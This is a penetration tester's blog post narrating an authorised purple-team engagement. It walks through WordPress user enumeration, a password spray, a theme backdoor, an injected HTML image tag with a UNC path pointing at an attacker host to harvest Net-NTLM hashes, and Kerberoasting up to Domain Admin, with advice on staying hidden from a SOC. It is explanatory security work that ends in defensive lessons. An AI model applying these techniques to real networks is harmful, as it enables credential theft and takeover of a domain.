---
title:  "No Responder? No problem! - Abusing HTML and UNC"
date:   2018-08-10 10:04:23
categories: Internal
tags: Stealth, Evasion, Internal
---

When I first began learning about IT security, AV evasion meant encoding signatures, and ```' OR '1' = '1``` was enough to get into most web applications. 14 years later, security has evolved into a much different
landscape. While the above techniques certainly still work in some cases, today's networks are much more complex. AV's now have sandboxes and emulators, and web applications are protected on the 7th layer.
The last thing a consultant wants during an engagement is to be caught because one of their payloads tripped a defense mechanism.

A few months ago I was part of a purple team engagement, during which a client hired us to both test their internal network security as well as their newly hired SOC's ability to catch malicious activity.
This was an interesting engagement because unlike most regular internal engagements, we had a team actively looking for us. This meant using our standard tools became too risky, so we had to think of a different
approach.

### 1. Getting credentials: Responder? Maybe not.
After a quick kickoff meeting we were off. Normally, in a regular internal penetration test this is where I would fire up wireshark and start listening for NBT-NS and LLMNR broadcasts. If found, fire up Responder,
collect some Net-NTLM hashes, throw hashcat at them and in some cases, r00t dance. However, we figured this would likely get us caught. To explain why, lets go back to how and why Responder works. I am not going to go
into the details of Responder and NBT-NS/LLMNR poisoning as the internet is filled with explanations of the attack. Suffice to say that when DNS fails to resolve a hostname for whatever reason 
(user "fat fingers" the name, DNS UDP packet - yes, [UDP](https://www.ietf.org/rfc/rfc1035.txt) - gets dropped, or some other reason) it turns back to Link Layer Multicast Name Resolution and NetBios name
service to resolve the name. It does this by sending a broadcast literally asking who the host is. 

![Who there]({{ "/images/responder/Query_Broadcast.png" | absolute_url }})

This is where Responder comes in. Depending on how its run, Responder may reply to some/all queries saying saying yep thats me. This then kicks off the NTLM authentication scheme and results in the 
challenge-response Net-NTLM hash we then proceed to crack or relay.

![l00t]({{ "/images/responder/response.png" | absolute_url }})

So, now that we know how the attack works, can you think of how detection works? Well, if Responder is run to respond to all queries where DNS fails, it will respond to everything. If a security appliance
were to broadcast someting that it knows is not present in the network like \\\thisdoesnotexist\, it can assume that anything that responds to this will likely be malicious and raise a flag. 

Well, the network is safe, lets pack it up and go home, blue team won. 

Not quite. 

Enumerating the network further we found the intranet 
page. A quick look revealed it was running WordPress, which meant if we could just get access to an account we could probably get code execution. Again, a vulnerability
scanner like WPScan would have been great here, but as stealth was important we opted for a manual approach. Examination revealed a fully patched installation, and looking through some of the source 
we saw references to a security plugin which made things a bit harder. We had two options. Either find an 0day in a plugin/Wordpress, which in a time boxed engagement is basically a no go, or compromise a user account.
Wordpress has a very handy feature that allows for username enumeration by appending ```/?author=1``` to the url. We tested this in the browser and succesfully got the username of the first account.
We then scripted the attack, being mindful of pausing a few minutes between requests, and tried enumerating the first 100 accounts. This yielded 76 different user accounts. We then tried a password spray with
good ol' ```Password1``` (you'd be surprised how many times that works) and success! 4 accounts went down, one of which was an administrator.

A backdoor on one of the theme pages got us code execuion on the server, which showed WordPress running as a restricted user. Looking for easy kills for privilege escalation did not result in anything obvious
so instead we opted to leverage our WordPress access to harvest some Net-NTLM hashes.

Net-NTLM hashes are the result of the NTLM challenge-response authentication scheme. Basically, when client A tries to access a resource on Server B, it must authenticate against it first. The process can be found in [Microsoft documentation](https://docs.microsoft.com/en-us/windows/desktop/SecAuthN/microsoft-ntlm)
but sumarized below:

---
1.    (Interactive authentication only) A user accesses a client computer and provides a domain name, user name, and password. The client computes a cryptographic hash of the password and discards the actual password.

2.    The client sends the user name to the server (in plaintext).

3.    The server generates a 16-byte random number, called a challenge or nonce, and sends it to the client.

4.    The client encrypts this challenge with the hash of the user's password and returns the result to the server. This is called the response.

5.    The server sends the following three items to the domain controller:
        User name
        Challenge sent to the client
        Response received from the client

6.    The domain controller uses the user name to retrieve the hash of the user's password from the Security Account Manager database. It uses this password hash to encrypt the challenge.

7.    The domain controller compares the encrypted challenge it computed (in step 6) to the response computed by the client (in step 4). If they are identical, authentication is successful.

---
There are significant differences between NTLMv1 and NTLMv2, but thats a topic for a different post. As we are dealing with windows 7/2008+ systems, NTLM here refers to NTLMv2.

From the above we can see that if we can somehow get someone to try and access a resource on our system (acting as the server on the above example), we'll be able to grab the Net-NTLM hash. 
There are many different ways of accomplishing this but the more interesting one given the circumstances is through HTML.
IE and EDGE (although ive succesfully tested with Chrome as well) both support UNC paths to load resources (such as images). An image tag like ```<img src="\\x.x.x.x\doesnotmatter.png" />``` would try to pull
```doesnotmatter.png``` from ```x.x.x.x```, which would kick off the authentication process with ```x.x.x.x```. Since the code executes in the browser of the client browsing our evil page, 
the resulting hash would belong to the user using the browser.

So, to recap: We have managed to gain administrative access to the WordPress site of the companies internal intranet, where it is safe to assume most browsers will land on when opened, and a way to abuse
evil html to grab NetNTLM hashes. See where im going with this?

![knock knock]({{ "/images/responder/wp.png" | absolute_url }})

Before saving the above, I started Metasploit's SMB server to catch all incoming connections. Note that I could have also used Impacket's smbserver.py or even Responder by disabling the responses to queries,
but Metasploit was just convenient at the time. As soon as the server was started and the file saved, hashes from all over the domain started flying in! In total I believe we gathered over 200 hashes in under an 
hour. 

![Who there]({{ "/images/responder/msf.png" | absolute_url }})

*Edit: If administrative access is available or there is access to a system with wireshark installed, and our smbserver tools are not available, I strongly recommend collecting hashes*
*with wireshark. Once enough hashes have been collected, bring the pcap over to a linux box and extract the NetNTLM hashes with [this](https://github.com/DanMcInerney/net-creds) fantastic tool*  

### Pwning the Domain: Red team 1, Blue team 0

With plenty of hashes, the next step was to crack them and begin moving laterally. Hashcat cracked roughly 20 accounts in a relatively short period of time. Checking these account's permissions we discovered
that none had elevated privileges. No matter, with domain credentials its usually only a matter of time before the domain goes down. Remembering the SOC's watchfull eyes over us, we kept our recognizance
to a minimum to prevent tripping any alert from monitoring systems. Instead, we opted for what are considered easy kills, which meant Kerberoasting.

Kerberoasting is the name of the attack given by [Tim Medina in 2014](https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf) to attacking Microsoft Windows Kerberos authentication. 
While a full description is out of scope, The following graphic taken from [Microsoft](https://technet.microsoft.com/pt-pt/library/cc772815(v=ws.10).aspx) illustrates the basics we need to understand for this attack:

![Kerberos]({{ "/images/responder/kerberos.gif" | absolute_url }})

To summarize the above, at logon, the client contacts the Key Distribution Center (KDC) and requests a Ticket Ticket Grating Ticket (TGT) from the KDC. The KDC valdiates the users information, such as 
permissions and group memberships, and if they check out it will issue a TGT. If the user then wishes to access a service, it will need to supply the TGT as well as the target's service principal
name (SPN). A SPN [is the name by which a Kerberos client uniquely identifies an instance of a service for a given Kerberos target computer](https://social.technet.microsoft.com/wiki/contents/articles/717.service-principal-names-spns-setspn-syntax-setspn-exe.aspx)
After verifying the data in the TGT (which only the KDC can read). the KDC will issue a TGS back to the client which *is signed with the target SPN's NTLM hash*. The TGS will then be presented to the service, 
which will ultimately decide whether or not to provide access.

We are interested in step 3/4. In modern systems, Kerberos uses AES encryption to encrypt the TGS ticket. However, this was not introduced until [Windows Vista/ and Windows 2008](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-vista/cc749438(v=ws.10)). 
Since Active Directory's introduction in Windows 2000, Windows has used RC4_HMAC symmetric encryption which uses the target SPN's NT (or NTLM as some of you may know it)
hash as the encryption/decryption key! Even though AES is the default, RC4 is still found due to
compatability requriements (since some services/systems do not yet support AES). If we look at the graffic above, any user can request a TGT from the KDC with valid domain credentials.
These do not have to belong to any privileged group - Kerberos lets the target service/system decide whether or not to grant permission to the user to use the service - which means any low privilege account can
get as many TGS tickets for different SPN's as we want! There are certain restrictions in regards to which SPN's are better for cracking and why, and if you'd like to know more I strongly recommend going [here](https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf)
and [here](https://adsecurity.org/?p=2293). 

Cool, so how does this help us? Well, the accounts created for services are usually over permissioned and part of the Domain Admin's group, as well as have passwords that are set to not expire, usually created
by a human (which as we know are horrible at creating truly random passwords). This means if we request TGS tickets encrypted with RC4 for a specific (or all available) SPN's, we can then attempt to open the tickets
by computing various NTHashes and trying to open the ticket. If we are succesful, it means we have the correct NTHash, which means we would have found the correct password for the target service account!
The best part? ***All this is done offline***. The attack is very hard to detect, because there are no explotis being launched, no malware being placed on any target system, and no bruteforcing being done against
AD. Although there [are ways to detect the attack](https://adsecurity.org/?p=3513), we felt fairly confident the logs were not being monitored to this degree.

We used Impacket's GetSPNs.py to request a list of all suiteable SPN's for cracking using one of the cracked accounts, and got to work. A short time later, there was a hit. Sure enough, after checking the account's
group membership there it was: Domain Admins.

![Kerberos]({{ "/images/responder/getuserspn.png" | absolute_url }})

From here it was easy to grab the crown jewels. A few screen shots later, we had everythind we needed and the engagement was done. Throughout the whole test we managed to stay hidden from the SOC and raised no flags. 
As part of the engagement, our report was given to them, and we had the chance to work with them on defenses and indicators against the above attacks. 
In both WordPress and Kerberoasting instances, the underlying issue was not enforcing the least privilege principle. Over permissioned accounts in WordPress with weak credentials led to the disclosure of 
hundreds of domain account hashes, which gave us the foothold required to request TGS tickets. Weak passwords allowed these to be cracked, which once again due to excessive permissions led to the 
compromise of the whole Active Directory environment.  




